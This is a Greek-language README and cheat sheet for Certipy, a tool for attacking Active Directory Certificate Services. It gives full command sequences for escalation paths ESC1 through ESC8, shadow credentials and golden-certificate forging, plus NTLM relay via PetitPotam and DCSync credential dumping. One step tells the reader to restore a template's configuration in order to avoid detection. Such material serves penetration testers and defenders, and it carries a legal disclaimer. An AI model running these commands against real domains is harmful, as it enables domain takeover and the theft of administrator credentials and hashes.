<!-- language-home-navigation -->
[🏠 Ελληνική Αρχική Σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🏛️ Πιστοποιητικό - Πλήρες φύλλο εξαπάτησης

[🇹🇷 Türkçe Sürüm](μεταφράσεις/README.tr.md)
```
   ██████╗███████╗██████╗ ████████╗██╗██████╗ ██╗   ██╗
  ██╔════╝██╔════╝██╔══██╗╚══██╔══╝██║██╔══██╗╚██╗ ██╔╝
  ██║     █████╗  ██████╔╝   ██║   ██║██████╔╝ ╚████╔╝ 
  ██║     ██╔══╝  ██╔══██╗   ██║   ██║██╔═══╝   ╚██╔╝  
  ╚██████╗███████╗██║  ██║   ██║   ██║██║        ██║   
   ╚═════╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝╚═╝        ╚═╝   
       Active Directory Certificate Services (AD CS) Abuse
```
<p align="center">
  <img src="https://img.shields.io/badge/Certipy-AD_CS_Abuse-blue?style=for-the-badge" alt="Certipy">
  <img src="https://img.shields.io/badge/ESC1_to_ESC15-Vulnerabilities-red?style=for-the-badge" alt="ESC1-ESC15">
  <img src="https://img.shields.io/badge/PKINIT-Kerberos_Auth-orange?style=for-the-badge" alt="PKINIT">
  <img src="https://img.shields.io/badge/Active_Directory-Privilege_Escalation-green?style=for-the-badge" alt="AD PrivEsc">
</p>

<p align="center">
  <b>🔑 Ολοκληρωμένο εργαλείο για την απαρίθμηση και την εκμετάλλευση εσφαλμένων διαμορφώσεων των υπηρεσιών πιστοποιητικών υπηρεσιών καταλόγου Active Directory (AD CS)</b>
</p>

---

## 📋 Πίνακας περιεχομένων

- [Εισαγωγή](#-εισαγωγή)
- [Γιατί κατάχρηση AD CS;](#-why-ad-cs-abuse)
- [Εγκατάσταση] (#-εγκατάσταση)
- [Επισκόπηση υποεντολών Certipy](#-certipy-subcommands-overview)
- [Enumeration & Discovery (`find`)](#-enumeration--discovery-find)
- [The ESC Vulnerability Matrix](#-the-esc-vulnerability-matrix)
  - [ESC1: Enrollee Supplies Subject Alt Name (SAN)](#esc1-enrollee-supplies-subject-alt-name-san)
  - [ESC2: Any Purpose EKU or SubCA](#esc2-any-purpose-eku-or-subca)
  - [ESC3: Certificate Request Agent](#esc3-certificate-request-agent)
  - [ESC4: Vulnerable Template Access Control (ACL)](#esc4-vulnerable-template-access-control-acl)
  - [ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 Ενεργοποιημένο](#esc6-editf_attributessubjectaltname2-enabled)
  - [ESC7: Vulnerable CA Access Control](#esc7-vulnerable-ca-access-control)
  - [ESC8: NTLM Relay to HTTP Web Enrollment](#esc8-ntlm-relay-to-http-web-enrollment)
  - [ESC9 & ESC10: Strong Certificate Mapping Flaws](#esc9--esc10-strong-certificate-mapping-flaws)
- [Shadow Credentials (`shadow`)](#-shadow-credentials-shadow)
- [Χρυσά Πιστοποιητικά (`forge`)](#-χρυσά πιστοποιητικά-πλαστογραφία)
- [Έλεγχος ταυτότητας με PFX (`auth`)](#-authenticating-with-pfx-auth)
- [Ροές εργασιών επίθεσης σε πραγματικό κόσμο](#-ροές εργασίας-επίθεσης πραγματικού κόσμου)
- [Πίνακας γρήγορης αναφοράς] (#-ταχεία αναφορά-πίνακας)
- [Συμβουλές και βέλτιστες πρακτικές] (#-συμβουλές--βέλτιστες πρακτικές)
- [Νομική αποποίηση ευθυνών](#-νομική αποποίηση ευθυνών)
- [Πόροι](#-πόροι)

---

## 🎯 Εισαγωγή

Το **Certipy** (δημιουργημένο από τον Oliver Lyak) είναι το κορυφαίο εργαλείο που βασίζεται σε Python για την απαρίθμηση και την εκμετάλλευση των Υπηρεσιών Πιστοποιητικών της Active Directory (**AD CS**). Το AD CS είναι η εφαρμογή της Microsoft Public Key Infrastructure (PKI) για εταιρικά δίκτυα Active Directory, που χρησιμοποιείται ευρέως για σύνδεση έξυπνων καρτών, VPN, S/MIME και εσωτερική κρυπτογράφηση TLS.

Επειδή οι εσφαλμένες διαμορφώσεις πιστοποιητικών επιτρέπουν συχνά σε μη προνομιούχους χρήστες τομέα να ζητούν πιστοποιητικά ως Διαχειριστές Τομέα ή Ελεγκτές Τομέα, η κατάχρηση AD CS αντιπροσωπεύει ένα από τα πιο αξιόπιστα και επιδραστικά διανύσματα κλιμάκωσης τομέα στις σύγχρονες δοκιμές διείσδυσης επιχειρήσεων.

---

## ⚖️ Γιατί κατάχρηση AD CS;

- ⚡ **Άμεση κλιμάκωση τομέα:** Τα εσφαλμένα διαμορφωμένα πρότυπα πιστοποιητικών συχνά παρέχουν συμβιβασμό σε όλο τον τομέα σε δευτερόλεπτα.
- 🔑 **Υψηλό και επίμονο:** Τα κλεμμένα πιστοποιητικά ή τα πλαστά Χρυσά Πιστοποιητικά μπορούν να παραμείνουν σε ισχύ για χρόνια χωρίς να ενεργοποιούνται τυπικές ειδοποιήσεις αλλαγής κωδικού πρόσβασης.
- 🔄 **PKINIT σε NT Hash:** Οι έλεγχοι ταυτότητας Certipy ζήτησαν πιστοποιητικά `.pfx` μέσω του Kerberos PKINIT, ανακτώντας τον κατακερματισμό NT απλού κειμένου του στόχου απευθείας από το KDC.

---

## 📥 Εγκατάσταση

### Χρήση pipx (Συνιστάται)
```bash
pipx install certipy-ad
```
### Από το αποθετήριο GitHub
```bash
git clone https://github.com/ly4k/Certipy.git
cd Certipy
pip install .
```
### Επαλήθευση
```bash
certipy -h
```
---

## 🧭 Επισκόπηση Υποεντολών Certipy

| Υποεντολή | Λειτουργία |
|------------|----------|
| `find` | Απαριθμήστε CA, πρότυπα και εντοπίστε ευπάθειες ESC |
| `req` | Ζητήστε πιστοποιητικά από ευάλωτα πρότυπα |
| `auth` | Πραγματοποιήστε έλεγχο ταυτότητας χρησιμοποιώντας πιστοποιητικά `.pfx` για ανάκτηση κατακερματισμού TGT και NT |
| `ca` | Αριθμήστε και τροποποιήστε τις ρυθμίσεις διαμόρφωσης ΑΠ |
| `template` | Τροποποίηση ρυθμίσεων προτύπου πιστοποιητικού (χρήσιμο στο ESC4) |
| `account` | Διαχείριση λογαριασμών υπολογιστή Active Directory (MachineAccountQuota) |
| `shadow` | Exploit Shadow Credentials (`msDS-KeyCredentialLink`) |
| `forge` | Σφυρηλατήστε Χρυσά Πιστοποιητικά χρησιμοποιώντας κλεμμένο ιδιωτικό κλειδί ΑΠ |

---

## 🔍 Απαρίθμηση και ανακάλυψη (`find`)

Ξεκινήστε προσδιορίζοντας την Αρχή έκδοσης πιστοποιητικών επιχειρήσεων (CA) και σαρώνοντας για ευάλωτα πρότυπα:
```bash
# Enumerate all CAs and templates with standard credentials
certipy find -u 'john.doe@corp.local' -p 'P@ssword123' -dc-ip 10.10.10.1

# Print vulnerable templates directly to terminal
certipy find -u 'john.doe@corp.local' -p 'P@ssword123' -dc-ip 10.10.10.1 -vulnerable -stdout

# Output results formatted for BloodHound
certipy find -u 'john.doe@corp.local' -p 'P@ssword123' -dc-ip 10.10.10.1 -bloodhound
```
---

## 💥 Το ESC Vulnerability Matrix

### ESC1: Εναλλακτικό όνομα θέματος προμηθειών εγγεγραμμένων (SAN)

**Κατάσταση:**
- Οι χρήστες με χαμηλά προνόμια έχουν δικαιώματα εγγραφής (ενεργοποιημένο το `Client Authentication` EKU).
- Το πρότυπο καθορίζει το `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (επιτρέπει στον αιτούντα να καθορίσει οποιοδήποτε εναλλακτικό όνομα θέματος, όπως τον Διαχειριστή τομέα).

**Εκμετάλλευση:**
```bash
# 1. Request certificate on behalf of Domain Administrator
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'VulnerableTemplate' \
  -upn 'administrator@corp.local' \
  -dc-ip 10.10.10.1

# 2. Authenticate with resulting administrator.pfx via PKINIT
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```
*Η έξοδος δίνει το TGT του διαχειριστή και το NT Hash απλού κειμένου!*

---

### ESC2: EKU ή SubCA οποιουδήποτε σκοπού

**Κατάσταση:**
- Το πρότυπο καθορίζει το `Any Purpose` EKU ή δεν έχει οριστεί EKU.
- Μπορεί να χρησιμοποιηθεί για οποιονδήποτε σκοπό, συμπεριλαμβανομένου του ελέγχου ταυτότητας πελάτη.

**Αξιοποίηση:**
Χρησιμοποιείται πανομοιότυπα με το ESC1 ή χρησιμοποιείται σε συνδυασμό με το ESC3 για την απόκτηση πιστοποιητικού αντιπροσώπου εγγραφής.

---

### ESC3: Πράκτορας αιτήματος πιστοποιητικού

**Κατάσταση:**
- Το πρότυπο έχει το `Certificate Request Agent` EKU (Εκπρόσωπος Εγγραφής).
- Επιτρέπει την αίτηση πιστοποιητικών για λογαριασμό άλλου χρήστη σε δευτερεύοντα πρότυπα.

**Εκμετάλλευση:**
```bash
# 1. Request Enrollment Agent certificate
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'AgentTemplate' -dc-ip 10.10.10.1

# 2. Use the agent certificate to request on behalf of Administrator
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'UserTemplate' \
  -on-behalf-of 'CORP\administrator' \
  -pfx john.pfx -dc-ip 10.10.10.1

# 3. Authenticate with the obtained Administrator PFX
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```
---

### ESC4: Έλεγχος πρόσβασης ευάλωτου προτύπου (ACL)

**Κατάσταση:**
- Ο χρήστης χαμηλών προνομίων έχει δικαιώματα `WriteOwner`, `WriteDacl` ή `WriteProperty` σε ένα πρότυπο πιστοποιητικού.

**Εκμετάλλευση:**
```bash
# 1. Overwrite template configuration to make it vulnerable to ESC1
certipy template -u 'john.doe@corp.local' -p 'P@ssword123' \
  -template 'TargetTemplate' \
  -save-old \
  -dc-ip 10.10.10.1

# 2. Request certificate as Administrator (ESC1)
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'TargetTemplate' \
  -upn 'administrator@corp.local' -dc-ip 10.10.10.1

# 3. Restore original template configuration to avoid detection
certipy template -u 'john.doe@corp.local' -p 'P@ssword123' \
  -template 'TargetTemplate' \
  -configuration TargetTemplate.json -dc-ip 10.10.10.1
```
---

### ESC6: Ενεργοποιήθηκε το EDITF_ATTRIBUTESUBJECTALTNAME2

**Κατάσταση:**
- Η αρχή έκδοσης πιστοποιητικών έχει ορίσει τη σημαία `EDITF_ATTRIBUTESUBJECTALTNAME2`, επιτρέποντας σε οποιοδήποτε αίτημα πιστοποιητικού να καθορίζει αυθαίρετα SAN ανεξάρτητα από τις ρυθμίσεις προτύπου!

**Εκμετάλλευση:**
```bash
# Request certificate as Administrator using any template allowing Client Auth (e.g. default 'User')
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'User' \
  -upn 'administrator@corp.local' -dc-ip 10.10.10.1
```
---

### ESC7: Ευάλωτος έλεγχος πρόσβασης CA

**Κατάσταση:**
- Ο χρήστης έχει δικαιώματα `ManageCA` ή `ManageCertificates` στην ίδια την ΑΠ.

**Εκμετάλλευση:**
```bash
# 1. Add yourself as Officer on the CA
certipy ca -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -add-officer 'john.doe' -dc-ip 10.10.10.1

# 2. Enable vulnerable template on CA
certipy ca -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -enable-template 'SubCA' -dc-ip 10.10.10.1

# 3. Issue and retrieve previously denied request
certipy ca -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -issue-request <REQUEST_ID> -dc-ip 10.10.10.1
```
---

### ESC8: NTLM Relay to HTTP Web Enrollment

**Κατάσταση:**
- Η αρχή έκδοσης πιστοποιητικών έχει ενεργοποιημένο το τελικό σημείο HTTP Εγγραφής Ιστού (`/certsrv/`) με έλεγχο ταυτότητας NTLM χωρίς EPA (Εκτεταμένη προστασία για έλεγχο ταυτότητας) και HTTPS.

**Ροή εργασιών εκμετάλλευσης:**
1. Ξεκινήστε το `ntlmrelayx` δείχνοντας στην Εγγραφή ιστού CA:
   ```bash
   impacket-ntlmrelayx -t http://10.10.10.50/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
   ```
2. Ενεργοποιήστε τον εξαναγκασμένο έλεγχο ταυτότητας μηχανήματος μέσω PetitPotam ή PrinterBug:
   ```bash
   python3 petitpotam.py 192.168.1.100 10.10.10.1
   ```
3. Το `ntlmrelayx` αναμεταδίδει το NTLM auth του λογαριασμού μηχανής του DC, ζητά πιστοποιητικό υπολογιστή και βγάζει το base64 `.pfx`.
4. Πραγματοποιήστε έλεγχο ταυτότητας ως ελεγκτής τομέα χρησιμοποιώντας το Certipy:
   ```bash
   certipy auth -pfx dc01.pfx -dc-ip 10.10.10.1
   ```
5. Χρησιμοποιήστε τον κατακερματισμό NT του DC για να εκτελέσετε μια πλήρη ένδειξη DCSync με το `impacket-secretsdump`.

---

## 👥 Διαπιστευτήρια σκιάς (`shadow`)

Εάν ένας παραβιασμένος λογαριασμός έχει πρόσβαση εγγραφής στο χαρακτηριστικό `msDS-KeyCredentialLink` άλλου λογαριασμού:
```bash
# Automatically write key credential, authenticate via PKINIT, and recover target NT hash
certipy shadow auto -u 'john.doe@corp.local' -p 'P@ssword123' \
  -account 'TARGET_USER' \
  -dc-ip 10.10.10.1
```
---

## 👑 Χρυσά Πιστοποιητικά (`forge`)

Εάν έχετε παραβιάσει την ΑΠ και έχετε εξαγάγει το ιδιωτικό της κλειδί:
```bash
# Forge a Golden Certificate valid for any user without contacting the CA
certipy forge -ca-pfx ca_private.pfx \
  -upn 'administrator@corp.local' \
  -subject 'CN=Administrator,CN=Users,DC=corp,DC=local'

# Authenticate with the forged certificate
certipy auth -pfx administrator_forged.pfx -dc-ip 10.10.10.1
```
---

## 🔑 Έλεγχος ταυτότητας με PFX (`auth`)
```bash
# Retrieve TGT and NT hash via PKINIT
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1

# Save TGT to ccache for Kerberos ticketing
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1 -ldap-shell
```
---

## 🎬 Ροές εργασιών επίθεσης σε πραγματικό κόσμο

### Ολοκληρώστε την κατάληψη τομέα ESC1 σε 3 εντολές
```bash
# Step 1: Discover ESC1 template
certipy find -u 'alice@domain.local' -p 'Summer2026!' -dc-ip 10.10.10.1 -vulnerable -stdout

# Step 2: Request certificate as Administrator
certipy req -u 'alice@domain.local' -p 'Summer2026!' \
  -ca 'Domain-CA' \
  -template 'SmartCardUser' \
  -upn 'administrator@domain.local' \
  -dc-ip 10.10.10.1

# Step 3: Extract NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1

# Step 4: Full DCSync dump
impacket-secretsdump -hashes :<EXTRACTED_NT_HASH> 'domain.local/administrator@10.10.10.1'
```
---

## 📊 Γρήγορος πίνακας αναφοράς

| Εργασία | Εντολή |
|------|---------|
| **Αριθμήστε AD CS** | `certipy find -u u@d -p p -dc-ip <IP> -vulnerable -stdout` |
| **Αίτημα πιστοποιητικού (ESC1)** | `certipy req -u u@d -p p -ca <CA> -template <T> -upn admin@d -dc-ip <IP>` |
| **Επαλήθευση ταυτότητας PFX** | `certipy auth -pfx <file>.pfx -dc-ip <IP>` |
| **Τροποποίηση προτύπου (ESC4)**| `certipy template -u u@d -p p -template <T> -save-old -dc-ip <IP>` |
| **Διαπιστευτήρια σκιάς** | `certipy shadow auto -u u@d -p p -account <TARGET> -dc-ip <IP>` |
| **Διαχείριση δικαιωμάτων CA** | `certipy ca -u u@d -p p -ca <CA> -add-officer <u> -dc-ip <IP>` |
| **Forge Golden Cert** | `certipy forge -ca-pfx ca.pfx -upn admin@d -subject <DN>` |

---

## 💡 Συμβουλές και βέλτιστες πρακτικές

1. **Ελέγξτε τον συγχρονισμό ρολογιού DC:**
   Το Kerberos PKINIT απαιτεί το χρόνο του συστήματός σας να συγχρονιστεί εντός 5 λεπτών από τον ελεγκτή τομέα. Τρέξιμο:
   ```bash
   sudo rdate -n 10.10.10.1
   # or
   sudo ntpdate 10.10.10.1
   ```
2. **Χειριστείτε KDC_ERR_PADATA_TYPE_NOSUPP:**
   Εάν το `certipy auth` αποτύχει με αυτό το σφάλμα, ο ελεγκτής τομέα δεν έχει εγκαταστήσει έγκυρο πιστοποιητικό ελεγκτή τομέα για το PKINIT. Σε αυτήν την περίπτωση, χρησιμοποιήστε έλεγχο ταυτότητας LDAP ή SChannel.
3. **Πάντα να καθαρίζετε τα πρότυπα ESC4:**
   Όταν αλλάζετε πρότυπα πιστοποιητικών, να διατηρείτε πάντα και να εφαρμόζετε ξανά τη διαμόρφωση αντιγράφων ασφαλείας (`-configuration <FILE>.json`) για να αποφύγετε να αφήσετε το περιβάλλον ευάλωτο ή να προκαλέσετε λειτουργικές διακοπές.

---

## ⚠️ Νομική αποποίηση ευθύνης

> **ΣΗΜΑΝΤΙΚΟ:** Οι επιθέσεις των Υπηρεσιών Πιστοποιητικών της Active Directory παρέχουν κρίσιμη, υψηλού αντίκτυπου πρόσβαση διαχειριστή σε δίκτυα τομέα. Το πιστοποιητικό πρέπει να εκτελείται μόνο κατά τη διάρκεια εξουσιοδοτημένων δοκιμών διείσδυσης, ασκήσεων κόκκινης ομάδας και ελέγχων ηθικής ασφάλειας με γραπτή άδεια.

---

## 📚 Πόροι

- [Επίσημο αποθετήριο Certipy GitHub](https://github.com/ly4k/Certipy)
- [Certified Pre-Owned Whitepaper (SpecterOps)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [AD CS Attack Paths & Protections (Oliver Lyak)](https://posts.specterops.io/certified-pre-owned-d95910965cd2)